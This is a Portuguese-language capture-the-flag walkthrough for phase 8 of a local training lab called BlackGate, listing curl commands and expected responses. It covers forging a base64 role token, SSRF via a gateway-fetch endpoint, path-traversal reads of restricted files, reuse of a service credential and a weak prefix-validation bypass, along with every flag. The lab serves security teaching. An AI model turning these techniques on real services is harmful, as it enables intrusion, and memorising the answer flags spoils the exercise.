# Lab 05 - BlackGate - Walkthrough da Fase 8

Este walkthrough cobre a **Fase 8 - Maintenance Worker Processing Abuse** do Lab 05. A aplicacao mantem as fases anteriores e adiciona processamento inseguro simulado no maintenance worker de `legacy-panel.internal`.

Tudo continua seguro e local: nao ha request real para internet, banco externo, shell, upload, Redis, worker separado, filesystem real ou command injection real.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Saude e versao

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.7.0-phase8"
}
```

`/api/version` deve retornar build `bg-phase8-worker-processing`.

## Login e contexto operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fases anteriores preservadas

Fase 3:

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Flag esperada:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

Fase 4:

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Flag esperada:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

Fase 5:

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Flag esperada:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Obter legacy_session

Autentique no legacy realm com a credencial da Fase 6:

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

Acesse maintenance:

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Flag esperada da Fase 6:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## Criar o job da Fase 7

Crie o job aceito pelo workflow de reports:

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Resposta esperada:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

O job relevante:

```text
bg7-job-worker-diagnostics
```

## Consultar worker status

```bash
WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/status?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS"
```

Resultado esperado:

```json
{
  "service": "legacy-panel",
  "worker": "maintenance-worker",
  "status": "paused",
  "mode": "migration-review",
  "accepts": ["queued diagnostics jobs"],
  "blocked": ["external callbacks", "shell execution", "synchronous render"]
}
```

## Consultar worker queue

```bash
WORKER_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/queue?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_QUEUE"
```

Resultado esperado:

```json
{
  "queue": "maintenance-worker",
  "status": "review",
  "jobs": [
    {
      "job_id": "bg7-job-worker-diagnostics",
      "template": "worker-diagnostics",
      "status": "queued",
      "processor": "maintenance-worker"
    }
  ]
}
```

## Consultar detalhes do job

```bash
WORKER_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_JOB"
```

Observe:

- `template: worker-diagnostics`;
- `queue: maintenance-worker`;
- `diagnostics.profile: migration-safe`;
- `allowed_actions: status, checksum, trace`;
- `blocked_actions: exec, callback, shell`;
- `review_note` apontando para validacao no processor.

## Ler arquivos restritos da Fase 8

Use o mesmo bypass controlado do Files Vault:

```bash
WORKER_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/worker-review.txt"))')
DIAG_ACTIONS=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/diagnostics-actions.txt"))')
PROCESSOR_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/processor-notes.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$DIAG_ACTIONS"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PROCESSOR_NOTES"
```

Pontos importantes:

- o processor aceita jobs `worker-diagnostics` enfileirados;
- metadados de review ficam fora do seletor publico;
- algumas acoes sao validadas por prefixo;
- a fila elegivel e `maintenance-worker`;
- existe uma pista fragmentada para `trace:internal:queue`.

## Diagnostics

```bash
WORKER_DIAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG"
```

Resultado esperado:

```json
{
  "job": "bg7-job-worker-diagnostics",
  "profile": "migration-safe",
  "actions": ["status", "checksum", "trace"],
  "note": "Extended trace actions require review metadata."
}
```

Profile interno:

```bash
WORKER_DIAG_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&profile=internal"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG_INTERNAL"
```

Resultado esperado: `profile_restricted`.

## Testar actions decoy

Status:

```bash
WORKER_STATUS_ACTION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=status&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS_ACTION"
```

Checksum:

```bash
WORKER_CHECKSUM=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=checksum&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_CHECKSUM"
```

Trace basico:

```bash
WORKER_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE"
```

Essas respostas nao retornam flag.

Trace interno sem queue:

```bash
WORKER_TRACE_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE_INTERNAL"
```

Resultado esperado: `review_only`, sem flag.

Acao bloqueada:

```bash
WORKER_BLOCK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=exec&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_BLOCK"
```

Resultado esperado: `blocked_action`.

Sem review:

```bash
WORKER_NO_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_NO_REVIEW"
```

Resultado esperado: `review_required`.

## Obter a flag da Fase 8

O abuso controlado e a acao de trace interno da fila passando por validacao fraca de prefixo:

```bash
WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
```

Resposta esperada:

```json
{
  "service": "legacy-panel",
  "worker": "maintenance-worker",
  "job": "bg7-job-worker-diagnostics",
  "action": "trace:internal:queue",
  "processed": true,
  "finding": "worker diagnostics action accepted internal queue trace through weak prefix validation",
  "flag": "FLAG{blackgate_worker_processing_abuse_phase8}",
  "next_hint": "Final review requires correlating queue output with admin approval state."
}
```

## Flags confirmadas ate esta fase

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
FLAG{blackgate_gateway_trust_ssrf_phase4}
FLAG{blackgate_files_vault_controlled_read_phase5}
FLAG{blackgate_legacy_credential_reuse_phase6}
FLAG{blackgate_report_workflow_abuse_phase7}
FLAG{blackgate_worker_processing_abuse_phase8}
```

## O que fica para a proxima fase

A Fase 9 deve correlacionar a saida do worker com estado de aprovacao admin para chegar na flag final do Lab 5. Isso ainda nao existe nesta fase.
